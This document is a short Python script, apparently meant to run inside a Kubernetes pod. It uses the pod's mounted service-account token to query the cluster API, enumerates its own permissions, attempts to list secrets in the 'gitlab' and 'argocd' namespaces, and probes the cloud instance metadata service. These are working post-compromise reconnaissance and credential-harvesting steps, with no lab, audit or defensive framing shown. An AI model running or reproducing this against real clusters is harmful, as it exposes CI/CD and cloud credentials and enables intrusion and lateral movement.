import urllib.request, ssl, json
SA="/var/run/secrets/kubernetes.io/serviceaccount"
tok=open(SA+"/token").read().strip()
ctx=ssl.create_default_context(cafile=SA+"/ca.crt")
def req(path, body=None, hdrs=None):
    h={"Authorization":"Bearer "+tok}; h.update(hdrs or {})
    r=urllib.request.Request("https://kubernetes.default.svc"+path, data=body, headers=h, method="POST" if body else "GET")
    try:
        resp=urllib.request.urlopen(r, context=ctx, timeout=10)
        return resp.status, resp.read()[:3000].decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:1500].decode(errors="replace")
print("== selfsubjectrulesreview gitlab ==")
b=json.dumps({"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"gitlab"}}).encode()
st,bd=req("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", b, {"Content-Type":"application/json"})
print(st,bd[:2500])
print("== list secrets gitlab ==")
st,bd=req("/api/v1/namespaces/gitlab/secrets?limit=10")
print(st,bd[:1200])
print("== list secrets argocd ==")
st,bd=req("/api/v1/namespaces/argocd/secrets?limit=10")
print(st,bd[:1200])
print("== IMDS probe ==")
try:
    r=urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=4)
    print(r.status, r.read()[:200].decode(errors="replace"))
except Exception as e:
    print("IMDS:", e)
